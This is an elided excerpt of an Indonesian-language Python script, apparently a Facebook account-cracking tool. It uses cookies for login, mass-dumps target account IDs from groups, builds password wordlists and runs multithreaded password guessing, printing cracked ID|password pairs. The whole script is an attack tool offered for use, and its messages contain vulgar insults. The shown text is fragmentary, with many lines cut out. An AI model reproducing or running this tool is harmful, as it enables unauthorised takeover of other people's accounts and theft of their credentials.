...
'\t	ＳＳＳ ＮＥＶＥＲ ＤＩＥ ＦＯＲ ＳＵＲＲＥＮＤＥＲ ＣＲＡＣＫ ＣＹＢＥＲ ４０４ ＢＹ ＳＫＡＮＤＥＲＢＥＲＧ
'\t	
'\t	{m}•{k}•{h}•{sir} Author : Sss_Squad_2021 {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t🆂🆂🆂 Saran Ektensi : [green]Cookiedough/get cookies[red] 🆂🆂🆂'))
...
def menu(my_name,my_id):
	...
	cetak(nel('\tSelamat Datang [green]%s[white] hamba sadil kristus'%(my_name)))
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> Mau Berapa Target Njing ? by fadil gamstenk : '))
	except ValueError:
...
def grup():
	...
	ua = 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
...
#		taplikasi.append('no')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[green],sadil,danda[red]'))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Menggeser Rumah Mauke {m}•{k}•{h}•{x} <<<<< ')
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] Crack Selesai Ngab, Jangan Lupa ngocok pake foto danad[cyan] <<[white] '))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}>> {idf}|{pw}\n{ua}{N}')
				os.popen('play-audio .cp.mp3-lagi mukulin kepala sadil')
